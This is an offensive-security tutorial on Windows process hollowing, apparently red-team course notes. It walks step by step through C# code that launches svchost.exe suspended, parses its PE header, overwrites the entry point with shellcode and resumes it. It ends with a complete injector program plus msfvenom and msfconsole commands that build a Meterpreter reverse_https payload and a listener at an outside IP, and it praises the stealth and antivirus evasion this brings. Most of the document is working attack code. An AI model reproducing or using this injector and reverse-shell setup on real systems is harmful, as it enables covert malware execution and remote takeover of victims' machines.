# Process Injection & Migration

## 🔗 TOC
- [Process Hollowing Theory](#process-hollowing-theory)
- [Process Hollowing with CSharp](#process-hollowing-with-csharp)
- [Final Workflow Code (Complete Example)](#-final-workflow-code-complete-example)



---
# **Process Hollowing Theory**

### **🔹 Concept**

- When a process is created through the [CreateProcess API](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa), the operating system performs three actions:
    1. Creates the virtual memory space for the new process.
    2. Allocates the stack along with the [Thread Environment Block](https://en.wikipedia.org/wiki/Win32_Thread_Information_Block) (TEB) and the [Process Environment Block](https://en.wikipedia.org/wiki/Process_Environment_Block) (PEB).
    3. Loads the required DLLs and the EXE into memory.
    
    Once all of these tasks have been completed, the operating system will create a thread to execute the code, which will start at the `*EntryPoint*` of the executable.
    
- **Process Hollowing** is an injection technique where:
    1. A benign process is created in a **suspended state**.
    2. Its **EntryPoint code is replaced** with malicious shellcode.
    3. The process is resumed, running **attacker-controlled code** instead of the original program.
    
    ✅ Benefit: The malicious code runs **under the guise of a legitimate process** (e.g., `notepad.exe`, `svchost.exe`).
    

---

### 🔹 Workflow (Step by Step)

1. **Create Process in Suspended Mode**
    
    ```c
    CreateProcess("C:\\Windows\\System32\\notepad.exe", ..., CREATE_SUSPENDED, ...);
    ```
    
    - The process is created but **does not execute yet**.
    - Memory is allocated for:
        - **PEB (Process Environment Block)**
        - **TEB (Thread Environment Block)**
        - **EXE image + required DLLs**
    
    ---
    
2. **Get Process Information**
    - Use **`ZwQueryInformationProcess`** with `ProcessBasicInformation` to retrieve the PEB address.
        - From the PEB, we can obtain the base address of the process, which we can use to parse the PE headers and locate the EntryPoint.
    - At offset **0x10** into the PEB, we find the **Image Base Address** (base of the loaded EXE).
    
    ---
    
3. **Read the PE Headers**
    - Use **`ReadProcessMemory`** on the target process to inspect its PE header.
        - This allows us to read out the contents of the remote PEB at offset `0x10`.
        - Read the first `0x200` bytes of memory. This will allow us to analyze the remote process PE header.
            
            
            | **Offset** | **0x00** | **0x04** | **0x08** | **0x0C** |
            | --- | --- | --- | --- | --- |
            | 0x00 | 0x5A4D (MZ) |  |  |  |
            | 0x30 |  |  |  | Offset to PE signature |
            | 0x80 | 0x4550 (PE) |  |  |  |
            | 0xA0 |  |  | `AddressOfEntryPoint` |  |
    - Key fields to read:
        - `e_lfanew` (offset **`0x3C`**) → Offset to the **PE header**.
        - `PE Signature` (should be `0x4550` = "PE").
        - `AddressOfEntryPoint` (offset **`0x28`** from PE header start).
    
    📌 **Address of EntryPoint = Base Address + RVA (Relative Virtual Address).**
    
    ---
    
4. **Overwrite EntryPoint**
    - Use **`WriteProcessMemory`** to replace the instructions at the `EntryPoint` with shellcode.
    
    ---
    
5. **Resume Execution**
    - Resume the main thread with **ResumeThread**.
    - Execution begins at the shellcode instead of the original EXE code.

---

### 🔹 PE File Structure (Relevant Fields)

| **Offset (from base)** | **Field** | **Description** |
| --- | --- | --- |
| `0x3C` | `e_lfanew` | Offset to PE header |
| `PE Header + 0x28` | `AddressOfEntryPoint` | RVA of EntryPoint |
| `PE Header + 0x34` | `ImageBase` | Base address (already retrieved from PEB) |

---

### 🔹 Example Walkthrough

1. **PEB address** PEB = 0x3004000
2. **Image base** 
    - **Found at `PEB+0x10` →** `0x3004010`
    - Example value: `0x7ffff01000000`
3. **DOS Header → Locate NT Headers** 
    - Read **first 0x200 bytes** from `ImageBase`.
    - At `ImageBase + 0x3C` → `e_lfanew = 0x110`.
    - **PE NT Headers Start**:
        
        ```csharp
        NT_Headers = ImageBase + e_lfanew 
                   = 0x7ffff01000000 + 0x110
                   = 0x7ffff01000110
        ```
        
4. Locate Optional Header; `OptionalHeader = NT_Headers + 0x18`
5. `AddressOfEntryPoint` field
    - Inside Optional Header, **`AEP field offset = +0x10`**
    - So AEP RVA = value at (`PE_Header + 0x10 + 0x18`):
        
        ```csharp
        PE_Header + 0x28 = 0x7ffff01000138
        ```
        
    - **Read RVA of entry point** from `AEP_RVA` at `0x7ffff01000138`
6.  **Calculate Final Entry Point VA**
    - If `AEP_RVA = 0x2000`:
        
        ```csharp
        EntryPointVA = ImageBase + AEP_RVA
                     = 0x7ffff01000000 + 0x2000
                     = 0x7ffff01002000
        ```
        
7. **Injection Step**
    - `WriteProcessMemory()` → write shellcode to `EntryPointVA`at `0x7ffff01002000`.
8. **Execution**
    - `ResumeThread()` → process resumes execution at injected shellcode under a legitimate process context.

---

## 🔹 Advantages

- Stealthy: runs inside a trusted process.
- Persistence: survives until the hollowed process terminates.
- Difficult for AV to detect since the malicious code does not exist as a separate process.

---

# **Process Hollowing with Csharp**

Create a new Console App project in Visual Studio and name it "Hollow".

## 🔹 Step 1 – Creating a Suspended Process

- Use **`CreateProcessW`** API with the `CREATE_SUSPENDED (0x4)` flag.
- The process is created but not yet running → gives us a chance to modify memory.
- Function prototype
    
    ```c
    BOOL CreateProcessW(
      LPCWSTR               lpApplicationName,
      LPWSTR                lpCommandLine,
      LPSECURITY_ATTRIBUTES lpProcessAttributes,
      LPSECURITY_ATTRIBUTES lpThreadAttributes,
      BOOL                  bInheritHandles,
      DWORD                 dwCreationFlags,
      LPVOID                lpEnvironment,
      LPCWSTR               lpCurrentDirectory,
      LPSTARTUPINFOW        lpStartupInfo,
      LPPROCESS_INFORMATION lpProcessInformation
    );
    ```
    
- In C#, we call it via **P/Invoke**:
    
    ```csharp
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );
    ```
    
- STARTUPINFO structure using P/Invoke
    
    structure add the structure to the source code just prior to the DllImport statements.
    
    ```csharp
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    ```
    
- *PROCESS_INFORMATION*
    
    add this structure to the source code just prior to the DllImport statements.
    
    ```csharp
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    ```
    
- ➡ Example Usage: Launch **svchost.exe** in a suspended state:  Calling CreateProcess to create a suspended process
    
    ```csharp
    STARTUPINFO si = new STARTUPINFO();
    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    
    bool res = CreateProcess(
        null, "C:\\Windows\\System32\\svchost.exe",
        IntPtr.Zero, IntPtr.Zero, false, 0x4,
        IntPtr.Zero, null, ref si, out pi);
    ```
    

---

## 🔹 Step 2 – Extracting the PEB (Process Environment Block)

- We need the **Image Base Address** of the suspended process.
    - API: `ZwQueryInformationProcess` (class `ProcessBasicInformation = 0`)
    - Returns **PEB address** → `PEB+0x10` points to Image Base.
- The function prototype
    
    ```csharp
    NTSTATUS WINAPI ZwQueryInformationProcess(
      _In_      HANDLE           ProcessHandle,
      _In_      PROCESSINFOCLASS ProcessInformationClass,
      _Out_     PVOID            ProcessInformation,
      _In_      ULONG            ProcessInformationLength,
      _Out_opt_ PULONG           ReturnLength
    );
    ```
    
- Use **`ZwQueryInformationProcess`**:
    
    ```csharp
    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwQueryInformationProcess(
        IntPtr hProcess, int procInformationClass,
        ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);
    ```
    
- Structure for **PROCESS_BASIC_INFORMATION**:
    
    ```csharp
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }
    ```
    
    ➡ Example Usage to fetch **PEB address**:
    
    ```csharp
    PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
    uint tmp = 0;
    IntPtr hProcess = pi.hProcess;
    
    ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
    IntPtr ptrToImageBase = (IntPtr)((long)bi.PebAddress + 0x10);
    
    ```
    

---

## 🔹 Step 3 – Reading Memory (Image Base)

- API: `ReadProcessMemory`
- Used to read the **Image Base Address** and PE headers.

**Declaration**

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
static extern bool ReadProcessMemory(
    IntPtr hProcess, IntPtr lpBaseAddress,
    [Out] byte[] lpBuffer, int dwSize,
    out IntPtr lpNumberOfBytesRead);

```

**➡ Example Usage:**

```csharp
byte[] addrBuf = new byte[IntPtr.Size];
IntPtr nRead = IntPtr.Zero;
ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

```

---

## 🔹 Step 4 – Parsing the PE Header

- Need the **Entry Point RVA** from Optional Header.
- Steps:
    1. Read first 0x200 bytes.
    2. Locate `e_lfanew` at offset `0x3C`.
    3. EntryPoint RVA = `e_lfanew + 0x28`.

```csharp
byte[] data = new byte[0x200];
ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
```

- Locate **EntryPoint RVA**:
    
    <img width="801" height="314" alt="image" src="https://github.com/user-attachments/assets/ed0e43fe-791a-4fae-a406-8e9c58d9497a" />

    
    ```csharp
    uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
    uint opthdr = e_lfanew_offset + 0x28;
    uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
    
    IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (ulong)svchostBase);
    
    ```
    

---

## 🔹 Step 5 – Writing Shellcode

- API: `WriteProcessMemory`
- Overwrites EntryPoint with attacker’s shellcode.
- Use **`WriteProcessMemory`** to overwrite EntryPoint:

**Declaration**

```csharp
[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(
    IntPtr hProcess, IntPtr lpBaseAddress,
    byte[] lpBuffer, Int32 nSize,
    out IntPtr lpNumberOfBytesWritten);
```

**Usage**

```c

// Example: Meterpreter shellcode
byte[] buf = new byte[] { 0xfc, 0x48, 0x83, 0xe4, ... };

WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
```

---

## 🔹 Step 6 – Resuming Execution

- API: `ResumeThread`
- The suspended thread continues → executes shellcode.
    
    ```csharp
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);
    
    ResumeThread(pi.hThread);
    ```
    

---

## **🚀 Final Workflow Code (Complete Example)**

1. **CreateProcessW** → start process in suspended state (`svchost.exe`)
2. **ZwQueryInformationProcess** → fetch **PEB** & image base address
3. **ReadProcessMemory** → read PE header & EntryPoint
4. **WriteProcessMemory** → inject malicious shellcode into EntryPoint
5. **ResumeThread** → let process continue → executes attacker’s payload

```csharp
using System;
using System.Runtime.InteropServices;

class Hollowing
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    struct STARTUPINFO {
        public Int32 cb;
        public IntPtr lpReserved, lpDesktop, lpTitle;
        public Int32 dwX, dwY, dwXSize, dwYSize;
        public Int32 dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public Int16 wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_BASIC_INFORMATION {
        public IntPtr Reserved1, PebAddress, Reserved2, Reserved3, UniquePid, MoreReserved;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
        ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);

    static void Main()
    {
        // Step 1: Create Suspended Process
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe",
            IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

        // Step 2: Get PEB / Image Base
        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;
        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
        IntPtr ptrToImageBase = (IntPtr)((long)bi.PebAddress + 0x10);

        // Step 3: Read Image Base
        byte[] addrBuf = new byte[IntPtr.Size];
        IntPtr nRead = IntPtr.Zero;
        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

        // Step 4: Parse EntryPoint
        byte[] data = new byte[0x200];
        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
        uint opthdr = e_lfanew_offset + 0x28;
        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (ulong)svchostBase);

        // Step 5: Write Shellcode
        byte[] buf = new byte[] { 0xfc, 0x48, 0x83, 0xe4 /* … */ };
        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

        // Step 6: Resume Process
        ResumeThread(pi.hThread);
    }
}
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.2.142 LPORT=4444 -f csharp
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 10.10.16.24; set LPORT 4444; exploit"

```

---

## 🔹 Key Notes

- Works because process runs **trusted binary (svchost.exe)** → less suspicious.
- Adapt offsets & pointer sizes for **x86 vs x64**.
- Can be modified to inject a full EXE, not just shellcode.

---

